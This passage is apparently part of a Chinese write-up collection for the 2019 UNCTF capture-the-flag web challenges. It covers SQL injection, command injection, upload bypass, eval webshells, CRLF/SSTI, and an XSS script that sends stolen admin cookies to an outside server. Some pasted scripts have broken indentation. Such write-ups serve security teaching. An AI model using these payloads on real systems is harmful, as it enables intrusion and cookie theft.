![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/9e618fb43cad966f004872b3425b205c.png)

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/c4f6631e5bf9e483fa5e701bece84303.png)

1.  然后再打开一个新的找回密码页面，输入用户名 admin，点击找回密码，让 admin
    来覆盖 session 中要重置密码的用户名。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/f6385ecd7c88017b4baa6da954b168ae.png)

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/ec94155052d4ab93232ae1f468c82bba.png)

1.  再回到刚才那个重置密码的页面，重置密码为 123456。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/eb1184534bbd1f3e8ef175f7705bf88b.png)

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/62430ec7e0f066682ff42799ad7d450c.png)

1.  用用户名 admin，密码 123456登录得到 flag。

![](https://ctfwp.wetolink.com/2019unctf/NSB_Reset_Password/f717a68777d9e712337881febca5e0b7.png)

### Simple_Calc_1
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。

2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。

3）	如果网站在反向代理之后，获取客户端真实 IP 的方式就是获取 X-Forwared-For 等包含客户端真实 IP 的头，但如果要是不加检验直接获取往往会存在问题。

#### 解题过程
步骤：

1.  打开靶机，是这样一个计算器。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/d27df2668ae27f27a063d6b987cd7018.png)

1.  看下关于信息，这里有个次数显示。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/b0b573d84cafd0675faa1070b8c7bb7b.png)

1.  F12 看下，发现有个 backend 请求。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/464c5d083501cddef7761c9df433e87b.png)

1.  然后尝试构造 X-Forwarded-For 来伪造访客 IP，发现是可以伪造成功的。

127.0.0.1:

第一次访问：

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/91490e16b7ed10fc5394c244a21d5a97.png)

第二次访问：

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/c8fbb6689ccf4b1439f9d037e734ef02.png)

127.0.0.3：

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/06a6794a07376e5491a451c649cc6019.png)

1.  然后就可以尝试在这里尝试注入了。

>   多番测试之后，发现伪造 IP 为 127.0.0.3 ‘ or ‘1’=’1
>   之后，功能正常，说明此处有注入点。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/8b4f51e94030252d3a8e2415370a4654.png)

1.  所以我们就可以直接用sqlmap来跑出数据了，当然 flag 也可以直接拿到了。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_1/385f153ee5a1b029f6d869394de7a6f2.png)


### Simple_Calc_2
#### 原理知识
1）	由于开发者直接将参数作为后端命令执行时的变量传入，导致了命令执行。

2）	SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。通过此即可调用特定的应用程序来提权。

#### 解题过程
步骤：

1.  打开靶机，是这样一个计算器。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/d27df2668ae27f27a063d6b987cd7018.png)

1.  F12打开，然后随意点一下计算器看看，比如算一下 1+1 = 2。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/d3ec05886d5116299eac0bf1ada10431.png)

1.  网络请求看下，发现有个 calc.php请求。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/605bd5433b8f228a95a7449ce6d54f0f.png)

1.  来自己构造一个包试试能不能 rce。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/4450618a5f45d02b5ff45e794d1512d5.png)

1.  可以，那么就可以直接读flag.txt 试试。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/31695ba4e196bacc9185f4ace39d4453.png)

1.  不能读，来看看 flag.txt 的权限。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/91f7315da61b3f8645d4bdec37eab935.png)

1.  得找个带 suid 的可执行文件来读，来搜一下有哪些文件可用。

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/f3cdf1947bfc6ecb9cb44d66b80f2cfd.png)

1.  tac 可用，那就直接用这个来读吧。Flag 到手~

![](https://ctfwp.wetolink.com/2019unctf/Simple_Calc_2/340b7abb62126571f7e88534a3d78e1b.png)

### simple_upload
#### 解题过程
步骤：

打开靶机，就会出现源码

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/4a6d8492a31e140bdb81c9a604d25296.png)

分析功能后,我们需要上传一个webshell到服务器上

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/eb036fe029f933aa57fad2d509dd833e.png)

题目考点可以从源码中看到,首先是mime的类型检测

我们使用burp 获取中间的包进行修改即可绕过检测

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/806efed796ccc38c2f057929a640f1ee.png)

但是这样会有hacker的提示,可以看到源码中,对上传文件的内容进行了检测,对于此我们可以采用`<script>`这种标胶进行绕过(因为实验环境是在php5.6下进行的)

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/f8c565d0a43088e0e275918b8eb3dc4a.png)

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/b8ae496a19ec81796e8735d8afd78d76.png)

可以看到已经绕过了<?标记检测

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/5f09106c5dbb63f244227a2e3c32dc17.png)

这里又会遇到一个问题就是我们不能让他保存为php的后缀,

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/68c8683a8ee8e4c278875caa69d34d3e.png)

所以回到源码中发现他以数组的形式(这一句话`$file_name = reset($file) . '.' .$file[count($file)-1];)`进行判断,
且最后以move_uploaded_file函数进行上传.我们应该知道这个函数会递归删除文件最后的/.字符串(例如1.php/.会被转化为1.php,
而且是递归的),所以我们的思路就清楚了因为file_name等于`reset($file)`加一个.和`$file[count($file) -1]`组成的,所以我们让reset($file)为xxx.php/,再让·$file[count($file) -1]·为空,这样我们的文件名就能组成为xxx.php/.最后会删除/.所以就能保存为php格式了

再bp中按照这样输入,就可以发现上传成功了

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/f8a9d7ec635ec6b81c67ccea43b79703.png)

1.  然后访问上传的文件就可以

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/95c4e6217e0b04d524856002c667aac9.png)

1.  使用木马,post请求即可得到flag

![](https://ctfwp.wetolink.com/2019unctf/simple_upload/560dac94e98c14260d782c538b93dfcb.png)


### simple_web
#### 原理知识
1）	Php的webshell的基础知识,就是eval函数将得到的字符串当作了命令处理了

2）	简单的命令注入

#### 解题过程
步骤：

1.  打开靶机，出现这样一个页面

![](https://ctfwp.wetolink.com/2019unctf/simple_web/06bfb8dbc0aaf5eff525aa62328f0910.png)

1.  根据提示后,考虑存在robots.txt文件

2.  访问robots.txt出现一下内容

![](https://ctfwp.wetolink.com/2019unctf/simple_web/cd05e8f54491ee8ca9509894d171aa29.png)

1.  继续访问getsandbox.php,得到一下内容.

![](https://ctfwp.wetolink.com/2019unctf/simple_web/48b6ece7dfa4a83424b1ac39b7f3c1c8.png)

1.  了解大意后,发现是一个得到了一个沙盒,然后发送get请求reset=1就能重置沙盒

2.  接着访问属于自己的沙盒,发现如下代码

![](https://ctfwp.wetolink.com/2019unctf/simple_web/8c3da3873abb68f4f4aaa0b730b92af5.png)

1.  审计之后,发现会写入一个content.php的文件内,但是我们输入的字符都会被addslashes添加转义,从而保证安全

2.  规则大概如下`‘-\>/’,/-\>//`,所以我们需要采用特别的构造技巧,payload如下:`?content=aaa\';@eval($_POST[x]);;//`

3.  如此构造后我们content.php的内容就会变为如下的内容

![](https://ctfwp.wetolink.com/2019unctf/simple_web/8f2731c0e33de2dbb00d90bab6570ee7.png)

10 .使用菜刀链接,从而就在根目录下能得到flag

![](https://ctfwp.wetolink.com/2019unctf/simple_web/6027f5ba2089f795536a0e73e19facf2.png)

### smile doge
#### 原理知识
1） CRLF 注入漏洞， 是因为 Web 应用没有对用户输入做严格验证， 导致攻击者可以输入一些恶意字符。 攻击者一旦
向请求行或首部中的字段注入恶意的 CRLF， 就能注入一些首部字段或报文主体， 并在响应中输出， 所以又称为
HTTP 响应拆分漏洞（HTTP Response Splitting） 。

2） SSTI 和常见 Web 注入(SQL 注入等)的成因一样， 也是服务端接收了用户的输入， 将其作为 Web 应用模板内容的
一部分， 在进行目标编译渲染的过程中， 执行了用户插入的恶意内容。

#### 解题过程
1） 打开浏览器， 访问目标主机， 可以看到页面只有一个输入框， 简单测试可以看到输入的内容基本都原样输出了，
且默认页面输出为"Hello gugugu!" ， 输入"http://127.0.0.1" 后发现输出的内容为"Hello Hello gugugu!!" 
可以看到内容发生了嵌套， 说明可能存在 SSRF

![](http://yanxuan.nosdn.127.net/cc1ace6f4d5ec7ea66a91c7455b19f19.png)

2） 页面提示代号 9527， 于是输入"http://127.0.0.1:9527/" ， 发现同样出现了内容嵌套， 且内容为"Hello
No.9527!" ， 可以判断出内网中 9527 端口存在一个服务

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/1.png)

3） 用 Dirsearch 等工具能够很轻易地扫到备份文件： http://127.0.0.1/backup/.index.php.swp

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/2.png)

下载下来用 vim -r .index.php.swp 恢复源码

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/3.png)

4） 稍微搜一下能发现代码是 Golang 的， 首先可以看出 flag 是放在*http.Request 的 Header 中的， 结合 9527 端口
的回显是"Hello No.9527!" ， 可以得出 name 参数的值即为输出的值， 当请求的 Header 中含有"Logic" 头时， name
的值即为"Logic" 头的值， 但是 SSRF 在一般情况下是无法控制服务器发出请求中的 Header 的， 此时就要考虑如何
控制 SSRF 中的 Header， 即 CRLF 注入， 这里实际用的是 CVE-2019-9741。 构造 Payload： "http://127.0.0.1:9527/?
HTTP/1.1\r\nLogic: abc"

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/4.png)

5） 在 Go 的模板中， 要插入一个对象的值， 则使用`{\{.对象名}}`， 回忆之前的源码泄露， flag 是放在*http.Request
中的， 在结构体中可以看到*http.Request 的名为 MyRequest， 所以模板注入的 Payload 为`{\{.MyRequest}}`， 完整的
Payload：
`"http://127.0.0.1:9527/? HTTP/1.1\r\nLogic: {\{.MyRequest}}"`

![](https://ctfwp.wetolink.com/2019unctf/Smile_Dog/5.png)

### superwaf
#### 原理知识
1）	XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。
#### 解题过程
1.  打开浏览器，访问目标主机，可以看到界面如下图1所示：

![](https://ctfwp.wetolink.com/2019unctf/superwaf/036f99acf68475163a6e53b6db10216d.png)

图1 web界面

1.  每次提交payload需要提交MD5校验码，编写脚本爆破，脚本如下图2所示：

![](https://ctfwp.wetolink.com/2019unctf/superwaf/e9c99000cfc61be52802c83eee8e83db.png)

图2 爆破脚本

1.  绕过waf的思路是bypass xss/csp <frameset onpageshow =
    ，扫描下目录容易发现Admin
    dir的路径为/admin/admin.php，使用exp脚本生成的payload如下图3所示：

![](https://ctfwp.wetolink.com/2019unctf/superwaf/c0729be3a38a45c1026b73003b6ff325.png)

exp.py

```
#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/09/05, 18:30
"""

import requests
import base64
import hashlib
import string
import itertools

cookies = {
    "session": "vktest"
}

VPSIP = "123.206.21.178:8000"
URL = "http://123.206.21.178:8086/"


def fuck(p):
    code = "debug_by_virink"
    exp_loadjs = "<frameset onpageshow = console[`log`](self[`doc${\{name}}ument`][`write`](atob(`{}`)))>"
    exp = exp_loadjs.format(base64.b64encode(
        p.encode("utf-8")).decode("utf-8"))
    print("[+] Exp len : %d" % len(exp))
    print("[+] Exp : %s" % (exp))
    data = {
        "text": exp,
        "code": code
    }
    res = requests.post(URL, data=data, cookies=cookies)
    print("[+] Url : %s" % (res.url))


def get_cookie_flag():
    p = """<script>function v(){var d=document.getElementById("f").contentDocument;location.href=`//%s/?c=${escape(d.cookie)}`}</script><iframe id="f" src="/admin/admin.php" onload=v() ></iframe>""" % VPSIP
    fuck(p)

def baopo(x):
	code = ''
	strlist = itertools.product(string.letters + string.digits, repeat=4)
	for i in strlist:
		code = i[0] + i[1] + i[2] + i[3]
		encinfo = hashlib.md5(code).hexdigest()
		if encinfo[0:6] == x:
			print code
			break

if __name__ == "__main__":
    print("[+] Start")
    get_cookie_flag()
    baopo('74e9da')

```

图3 生成payload

1.  最后在vps上获取到admin的cookie，也就是flag，如下图4所示，或者也可以使用xss平台。

![](https://ctfwp.wetolink.com/2019unctf/superwaf/e3737b14892b4bd9f5bcd731250870c9.png)

图4 获取admin cookie

### Twice_Insert
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。

2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。

#### 解题过程
1）打开浏览器，访问目标主机，打开页面发现是sqli-labs-24关，原题是利用二次注入修改admin密码，这题修改admin密码却没有flag，要想拿到flag可能需要爆库。

2）根据题意，尝试布尔盲注

发现or被过滤

先注册一个用户，比如scl 1

然后注册 scl’and 1# 1

![](https://ctfwp.wetolink.com/2019unctf/Twice_Insert/15a739fa68845245743232b7c1eb9a25.png)

修改为0，

![](https://ctfwp.wetolink.com/2019unctf/Twice_Insert/072c4deede2956efe572d617b5530384.png)

需要将scl的密码重置为1

然后注册 scl’and 0# 1

登录修改密码

![](https://ctfwp.wetolink.com/2019unctf/Twice_Insert/4c28fdd6978b187d78ccb4e3a1dab41f.png)

提示

![](https://ctfwp.wetolink.com/2019unctf/Twice_Insert/83935b512a19b991f90f6be4add3eace.png)

说明更新失败，可以布尔盲注

1.  写个脚本

```
#
coding = utf - 8
import requests
url = "http://127.0.0.1/sqli/Less-24/login_create.php"
url1 = "http://127.0.0.1/sqli/Less-24/login.php"
url2 = "http://127.0.0.1/sqli/Less-24/pass_change.php"
#
将密码改回1
def change21():
    user = "scl"
    s = requests.session()
    data = {
        "login_user": user,
        "login_password": '0',
        "mysubmit": "Login"
    }
    r = s.post(url1, data)
    data = {
        "current_password": '0',
        "password": '1',
        "re_password": '1',
        "submit": 'Reset'
    }
    r = s.post(url2, data)

def second():
    flag = ""
    tmp = 1
    for i in range(1, 50):
        if tmp == 0:
        break
    tmp = 0
    for j in range(32, 127):
        s = requests.session()
    user = "scl'and ascii(substr((select database())," + str(i) + ",1))=" +
        str(j) + "#"
    print user
    # 注册用户名
    data = {
        "username": user,
        "password": '1',
        "re_password": '1',
        "submit": "Register"
    }
    r = s.post(url, data)
    # 登录用户
    data = {
        "login_user": user,
        "login_password": '1',
        "mysubmit": "Login"
    }
    r = s.post(url1, data)
    # print r.content.decode()
    if "YOU ARE LOGGED IN AS" in r.content.decode():
        print "login ok"
    #
    更改密码
    data = {
        "current_password": '1',
        "password": '0',
        "re_password": '0',
        "submit": 'Reset'
    }
    r = s.post(url2, data)
    if "successfully updated" in r.content.decode():
        flag += chr(j)
    tmp = 1
    print "change ok"
    change21()
    break
    print flag
second()
```

### WEB1
#### 原理知识
1）	网站编写过程中一般都会留下一个备份文件，该文件就是网站的源码

2）	Get在url中传递参数，而post需要利用插件或工具传递参数

#### 解题过程
1.  访问*www.zip*，自动下载了一个压缩包，

![](https://ctfwp.wetolink.com/2019unctf/WEB1/1d8cf0cc7d45d09ce7f325b96812842a.png)

>   发现是备份文件，打开获得源码

2）

![](https://ctfwp.wetolink.com/2019unctf/WEB1/ac01746aa312f20428c2dd397c7b79bc.png)

发现有两个flag，一个flag_ahead,一个flag_behind，代码审计

3)根据要求get和post传参：GET：un=0 and 1

POST：ctf[]=99999999999

![](https://ctfwp.wetolink.com/2019unctf/WEB1/0117a44d8a7012bb570efe7c924ff792.png)

4)提交flag

### WEB2
#### 原理知识
文件包含漏洞
#### 解题过程
1.  上传一个1.jpg，内容如下

2）

![](https://ctfwp.wetolink.com/2019unctf/WEB2/3bd74363271c5a249cc6f484d2fc1ed5.png)

>   得到了如下反馈：

![](https://ctfwp.wetolink.com/2019unctf/WEB2/a57a7a23d00b4a45fa9d990dce2905b9.png)

1.  知道了文件路径为uploads，因为是文件包含漏洞，尝试访问flag.php，如下图：

![](https://ctfwp.wetolink.com/2019unctf/WEB2/6f7768fab502e3521e206606bad98dbd.png)

4）使用hackbar访问1.jpg

![](https://ctfwp.wetolink.com/2019unctf/WEB2/cd62481b7de4602b5f8a6ebb042b83f4.png)

返回了GIF98，说明文件成功被包含,然后get传参，?a=ls，如下

![](https://ctfwp.wetolink.com/2019unctf/WEB2/9e3a6a1da887cba5b2e974347370f4a6.png)

访问uunnccttff，得到：

![](https://ctfwp.wetolink.com/2019unctf/WEB2/aec0815ca02c50378acc6f39d264304f.png)

得到了flag的目录，查看：

![](https://ctfwp.wetolink.com/2019unctf/WEB2/dc7959f415ef440bbde95597a316abcf.png)

得到了flag
### 阿风日记
#### 原理知识
1）	利用burp intruder组件可以很方便的使用字典进行爆破
#### 解题过程
步骤：

1.  打开靶机，出现这样一个页面

2.  可以根据日记大概猜测出博主喜欢设置弱密码

![](https://ctfwp.wetolink.com/2019unctf/afeng/2a75be6c242dc75458b1dcded32f222f.png)

1.  发现有个秘密文章需要密码访问

![](https://ctfwp.wetolink.com/2019unctf/afeng/20ad6f319e2c8f95498d53e9dc7856b1.png)

1.  抓包之后,导入intruder

![](https://ctfwp.wetolink.com/2019unctf/afeng/5dcde82bc039c1afa925974f91cf80ff.png)

>   4.清除变量,设置pass为唯一变量,

>   5.粘贴弱密码

![](https://ctfwp.wetolink.com/2019unctf/afeng/7a8c435d2821b02ceb57c4b0f2127ba1.png)

>   6.爆破,查看长度,得到flag

![](https://ctfwp.wetolink.com/2019unctf/afeng/9afc1b6119ea76ec7114a97fe811e24f.png)

### 光坂镇的小诗1
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。

2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。

3）	如果网站在反向代理之后，获取客户端真实 IP 的方式就是获取 X-Forwared-For 等包含客户端真实 IP 的头，但如果要是不加检验直接获取往往会存在问题。

#### 解题过程
步骤：

1.  打开靶机，是这样一个诗句。

![](https://ctfwp.wetolink.com/2019unctf/poetry1/461f19be6f216920976681e519c61a4a.png)

1.  再四处查看信息过后,可以发现每一个链接都是一个get的请求,只是数字不同而已

![](https://ctfwp.wetolink.com/2019unctf/poetry1/05f123e304c9cf594c1e7480767df862.png)

1.  此外还有一个输入的内容提示,

![](https://ctfwp.wetolink.com/2019unctf/poetry1/ef0b300788c1f28df2b4c2d2cb66996c.png)

1.  尝试sql注入报错,输入’字符,发现输入提示变为了如下

![](https://ctfwp.wetolink.com/2019unctf/poetry1/e88983a71e6d706e7bfa3e14b59d9e8f.png)

1.  可以发现被转化了,本题考点是宽字节注入,考虑新生水平,所以将输入转化的内容直接提示出来了,这样很方便构造,所以我们可以按照输入构造sql语句,payload如下

2.  先看本数据库的表有那些,( -1%df%27union%20select%20(select
    group_concat(table_name) from information_schema.tables where
    table_schema=database()),2%20%23)

![](https://ctfwp.wetolink.com/2019unctf/poetry1/acd161badbee1b8f5943fd04c54b81bc.png)

1.  可以看到有个flag,和img表,接下来直接读取flag的内容,payload如下,(
    -1%df%27union%20select%20(select%20*%20from%20flag%20limit%200,1),2%20%23)

2.  Flag出来了

![](https://ctfwp.wetolink.com/2019unctf/poetry1/a1308c2747d8e3b723e43bc5fff204d7.png)

### 光坂镇的小诗2
#### 原理知识
1）	由于网站开发者在进行代码编写过程中未对输入参数进行严格校验及过滤，导致黑客可以通过构造SQL语句，获取目标网站后台数据库中的信息。
2）	SQL注入是输入特定的SQL语句达到SQL注入的效果，不同类型的SQL数据库类型所对应的SQL语句不一样，因此，尝试SQL注入测试前，需要获取目标网站数据库类型，通常，根据测试者的测试经验或采用不同数据库类型的测试的方法进行测试，有效获得目标网站真实数据库类型。

#### 解题过程
步骤：

打开靶机， 留着一些诗

![](https://ctfwp.wetolink.com/2019unctf/poetry2/e0a3bf881355f24f02c29365011ddd9c.png)

可以看到每一个链接都是发送了一个get请求,

![](https://ctfwp.wetolink.com/2019unctf/poetry2/053a899f3abee34a470191ed4487364c.png)

可以大体判断出是get id然后,数据库返回id的图片的地址

但是题目信息只提示了他再数据库中,如果get

id的数字超过了6就没有提示了,于是尝试sql注入,再地址栏提交1’网页没有提示,但是提交1’%23则有提示了,所以判断出了是考察的布尔盲注,并且没有过滤.

![](https://ctfwp.wetolink.com/2019unctf/poetry2/6d811e297599e170be14e515d8c1dffd.png)

![](https://ctfwp.wetolink.com/2019unctf/poetry2/515010b75b4716538b8320eebfc08d4f.png)

编写python脚本,在exp中

```
?id=1' and length(database())='{}' %23 判断数据库长度

?id=1' and substr(database(),{0},1)='{1}' %23 爆破数据库名

id=1' and (substr((select group_concat(table_name) from information_schema.tables where table_schema='ctf'),{0},1))='{1}' %23 爆破表
```

最后再flag表中flag字段得到了flag

拿到flag

![](https://ctfwp.wetolink.com/2019unctf/poetry2/082f17708bacf56725f305f0f229fa1c.png)

### 加密的备忘录
#### 原理知识
1) GraphQL可以使用不同的查询，返回不同的结果集合
base64编码把8字节字符分割为6字节字符，然后去查表，构造出  

2) base64字符串。这里提供了加密后的密文，只要控制加密前的6位，就可以获取
到base64编码表。
#### 解题过程
打开首页，只有一个简单界面,如图1:

![](https://ctfwp.wetolink.com/2019unctf/book1/1.png)

图1 默认主页面

没有发现有用的地方，查看源码，从注释中发现与GraphQL相关，访问GraphQL默认页面，返回错误消息，如图2：

![](https://ctfwp.wetolink.com/2019unctf/book1/2.png)

图2 访问graphql查询地址返回结果

可以看到没有提供GraphQL的图形化查询界面,使用浏览器插件Altair GraphQL Client即可以进行图形化的查询，如图3:

![](https://ctfwp.wetolink.com/2019unctf/book1/3.png)

图3 Altair图形化的GraphQL查询界面

使用图形化界面的优点是方便查看schema(即接口文档，这个GraphQL服务提供了什么样的接口)。

2.2 寻找漏洞点

测试GraphQL的所有功能，发现memos有一个private字段，并提供了修改功能可以修改这个字段值，构造修改查询，可以看到mid等于2可以修改成
功，如图4:

![](https://ctfwp.wetolink.com/2019unctf/book1/4.png)

图4 修改private属性为false

再查询memos，能看到多了1条记录，但是还是看不到留言内容。通过使用allUsers查询可以获得详细的memo信息，结果如图5:

![](https://ctfwp.wetolink.com/2019unctf/book1/5.png)

图5 使用allUsers查询获取留言的详细信息可以看到有

password和content字段，但两个字段的内容看上去都不对。

3.2.3 base64解密

根据主页中的注释，提示有base，并且长度为64个字符，猜测为base64加密，如图6:

![](https://ctfwp.wetolink.com/2019unctf/book1/6.png)

图6 主页源码中的注释

GraphQL中有checkPass这个查询可以使用，提供一个memo的id和密码返回检测结果,随便猜测一个密码，结果如图7:

![](https://ctfwp.wetolink.com/2019unctf/book1/7.png)

图7 checkPass查询结果

错误消息中提示了输入的密码加密后的结果。根据base64原理，可以获取到base64的转换表，具体代码如下：

```
#!/usr/bin/env python

#coding = UTF - 8
import base64
import json
import requests# 代理设置
proxy = 'http://127.0.0.1:8080'
use_proxy = False
MY_PROXY = None
if use_proxy:
    MY_PROXY = {
        'http': proxy,
        'https': proxy,
    }
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
    'Upgrade-Insecure-Requests': '1',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en,ja;q=0.9,zh-HK;q=0.8',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
}
my_cookie = {}
def http_req(url, data = None, method = 'GET', params = None, json =
        False, cookies = None, proxies = MY_PROXY):
    if json:
        method = 'POST'
        json = data
        data = None
    if method == 'GET':
        params = data
        data = None
    r = requests.request(method, url, headers = headers, verify = False,
        json = json, params = params, data = data, cookies = cookies, proxies = MY_PROXY)
    return r

def graph_req(url, body):
    body = {
        'query': body
    }
    r = http_req(url, data = body, json = True)
    return r.json()

url = "http://localhost:8800/graphql"

def base64_decode(base_table):
    '''
    base64的6位索引转换为字符串
    '''
    bases = ''.join(base_table)
    bytes_len = int(len(bases) / 8)
    byte_table = [bases[i * 8: (i + 1) * 8]
        for i in range(bytes_len)
    ]
    # bases2 = ''.join(byte_table)
    # if bases != bases2: 
    #print('error...')
    char_table = [int(b, 2) for b in byte_table]
    return char_table

def decode_one(tbl, idx):
    tbl = ['{0:06b}'.format(i) for i in tbl]
    rtbl = base64_decode(tbl)
    s = ''.join([chr(i) for i in rtbl])
    r = graph_req(url, '''
            query {
            checkPass(memoId: 2,
                password: "%s")
        }
        ''' % s)
    message = r['errors'][0]['message']
    print(idx, message)
    valid_code = message.split("'")[1][3]
    return valid_code# 获取base64编码表

base_tbl = []

for c in range(64):
    tbl = [0 b111111, 0 b111111, 0 b011011, c]
    valid_code = decode_one(tbl, c)
    base_tbl.append(valid_code)

# padding字符
valid_code = decode_one([0 b111111, 0 b111111, 0 b011011], -1)
base_tbl.append(valid_code)
base_tbl = ''.join(base_tbl)
    
std_b64_table =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def decode(s):
    table = str.maketrans(base_tbl, std_b64_table)
    new_s = s.translate(table)
    new_s += "="
    result = base64.b64decode(bytes(new_s, 'utf-8'))
    return str(result, 'utf-8')
    
print('password:', decode('要有了产于了主方以定人方于有成以他的爱爱'))
print('flag:', decode(
    '到年种成到定过成个他成会为而时方上而到年到年以可为多为而到可对方生而以年为有到成上可我行到他的面为们方爱'))
```
```
0 '十十地的' not valid password.
1 '十十地一' not valid password.
2 '十十地是' not valid password.
3 '十十地在' not valid password.
4 '十十地不' not valid password.
5 '十十地了' not valid password.
6 '十十地有' not valid password.
7 '十十地和' not valid password.
8 '十十地人' not valid password.
9 '十十地这' not valid password.
10 '十十地中' not valid password.
11 '十十地大' not valid password.
12 '十十地为' not valid password.
13 '十十地上' not valid password.
14 '十十地个' not valid password.
15 '十十地国' not valid password.
16 '十十地我' not valid password.
17 '十十地以' not valid password.
18 '十十地要' not valid password.
19 '十十地他' not valid password.
20 '十十地时' not valid password.
21 '十十地来' not valid password.
22 '十十地用' not valid password.
23 '十十地们' not valid password.
24 '十十地生' not valid password.
25 '十十地到' not valid password.
26 '十十地作' not valid password.
27 '十十地地' not valid password.
28 '十十地于' not valid password.
29 '十十地出' not valid password.
30 '十十地就' not valid password.
31 '十十地分' not valid password.
32 '十十地对' not valid password.
33 '十十地成' not valid password.
34 '十十地会' not valid password.
35 '十十地可' not valid password.
36 '十十地主' not valid password.
37 '十十地发' not valid password.
38 '十十地年' not valid password.
39 '十十地动' not valid password.
40 '十十地同' not valid password.
41 '十十地工' not valid password.
42 '十十地也' not valid password.
43 '十十地能' not valid password.
44 '十十地下' not valid password.
45 '十十地过' not valid password.
46 '十十地子' not valid password.
47 '十十地说' not valid password.
48 '十十地产' not valid password.
49 '十十地种' not valid password.
50 '十十地面' not valid password.
51 '十十地而' not valid password.
52 '十十地方' not valid password.
53 '十十地后' not valid password.
54 '十十地多' not valid password.
55 '十十地定' not valid password.
56 '十十地行' not valid password.
57 '十十地学' not valid password.
58 '十十地法' not valid password.
59 '十十地所' not valid password.
60 '十十地民' not valid password.
61 '十十地得' not valid password.
62 '十十地经' not valid password.
63 '十十地十' not valid password.
-1 '十十生爱' not valid password.
password: HappY4Gr4phQL
flag: flag{a98b35476ffdc3c3f84c4f0fa648e021}
```
通过获取base64编码表，实现base64算法，成功解密flag。


### 简单的备忘录
#### 原理知识
GraphQL可以提供不同的查询接口，返回不同的结果集合。主要是学习GraphQL查询语句的构造。
#### 解题过程
**目标发现**

打开首页，有一个超链接，打开后是GraphiQL的查询界面,如图1:

![](https://ctfwp.wetolink.com/2019unctf/book2/1.png)

图1 GraphiQL查询界面

漏洞寻找

通过GraphiQL的Documentation Explorer可以看到支持的查询，测试各种查询返回的结果。 通过如下查询，可以获取所有用户的所有memos信息：
```
query {
  allUsers {
     edges {
       node {
         username
            memos {
                edges {
                    node {
                        id
                        private
                        content
                        }
                    }
                }
            }
        }
    }
}
```
username查询执行结果如图2:

![](https://ctfwp.wetolink.com/2019unctf/book2/2.png)

图2 获取所有memos的查询结果

查看schema，还提供了一个UpdateMemoInfo的修改功能。
2.3 漏洞利用
通过UpdateMemoInfo修改memo的private属性,修改结果如图3:

